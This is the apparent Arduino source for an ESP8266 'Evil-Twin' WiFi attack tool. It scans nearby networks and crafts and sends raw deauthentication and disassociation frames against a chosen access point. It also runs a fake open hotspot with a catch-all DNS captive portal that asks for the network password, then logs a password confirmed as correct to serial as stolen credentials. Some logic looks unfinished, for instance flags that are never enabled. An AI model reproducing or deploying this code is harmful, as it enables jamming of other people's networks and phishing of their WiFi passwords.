#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h> // Include LittleFS for file handling

extern "C" {
#include "user_interface.h"
}

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

// Global variables
String _correct = "";
String _tryPassword = "";
bool hotspot_active = false;  // Moved to global scope
bool deauthing_active = false;
unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

// Function prototypes
void clearArray();
void handleIndex();
void handleResult();
void handleAdmin();
String readHTMLTemplate();
String bytesToStr(const uint8_t* b, uint32_t size);

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);

  // Initialize LittleFS to read HTML file
  if (!LittleFS.begin()) {
    Serial.println("Failed to mount file system");
    return;
  }

  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("Evil-Twin", "12345678");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><body><h2>Wrong Password</h2><p>Please, try again.</p></body></html>");
    Serial.println("Wrong password tried!");
  } else {
    webServer.send(200, "text/html", "<html><body><h2>Good password</h2></body></html>");
    hotspot_active = false;  // Use the global variable
    dnsServer.stop();
    WiFi.softAP("Evil-Twin", "YellowPurple");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    Serial.println("Good password was entered!");
    Serial.println(_correct);
  }
}

void handleIndex() {
  if (hotspot_active == false) {  // Use the global variable
    String _html = readHTMLTemplate();
    _html.replace("{success_message}", _correct.isEmpty() ? "" : "<h3>" + _correct + "</h3>");
    webServer.send(200, "text/html", _html);
  } else {
    webServer.send(200, "text/html", "<html><body><form action='/'><label>Password:</label><input type='text' name='password'><input type='submit'></form></body></html>");
  }
}

void handleAdmin() {
  String _html = readHTMLTemplate();
  webServer.send(200, "text/html", _html);
}

String readHTMLTemplate() {
  File file = LittleFS.open("/index.html", "r");
  if (!file) {
    Serial.println("Failed to open HTML file");
    return "";
  }
  String html = file.readString();
  file.close();
  return html;
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {
    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}